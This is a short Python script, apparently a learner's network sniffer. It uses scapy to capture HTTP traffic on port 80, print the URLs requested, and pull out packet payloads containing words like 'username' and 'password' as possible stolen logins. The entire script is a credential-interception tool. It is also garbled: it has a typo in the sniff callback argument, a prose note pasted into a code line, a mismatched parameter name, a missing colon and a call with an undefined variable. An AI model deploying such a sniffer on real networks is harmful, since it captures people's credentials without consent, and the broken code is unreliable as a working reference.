#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
	scapy.sniff(iface=interface, store=False, pnr=process_stored_packet, filter="port 80") [only if you want to extract information froma particular layer like udp and tcp]
	
def get_url(packet):
	return packet[http.HTTPRequest].Host +packet[http.HTTPRequest].Path

def get_login_info(packets):
	if packet.haslayer(scapy.Raw):
			load=packet[scapy.Raw].load
			keywords = ["username","user","login","password","pass"]
			for keyword in keywords
				if keyword in load:
					return load
					

def process_stored_packet(packet):
	if packet.haslayer(http.HTTPRequest):
		url = get_url(packet)
		print("Http request"+url)

		login_info = get_login_info(packet)
		if login_info:
			print("Possible username and password"+login_info)
sniff(packet)
/